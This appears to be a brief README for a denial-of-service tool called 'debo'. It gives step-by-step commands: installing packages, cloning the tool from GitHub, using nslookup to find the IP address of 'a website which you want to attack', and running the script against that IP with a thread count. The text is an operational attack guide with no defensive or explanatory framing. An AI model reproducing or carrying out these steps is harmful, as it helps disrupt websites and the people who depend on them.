$ apt update
<br>
$ apt upgrade
<br>
$ apt install python
<br>
$ apt install git
<br>
$ apt install dnsutils
<br>
$ git clone https://github.com/opsdebo/Ddosdebo/
<br>

debo need the Name Server of a website which you want to attack...
To get the Name Server...just type
$ nslookup example.com
Note the IP Address of that Website
<br>
then
<br>
$ cd debo
<br>
$ python debo.py -s [ip Address] -t 135
<br>
example:
<br>
$ python debo.py -s 123.45.67.89 -t 135
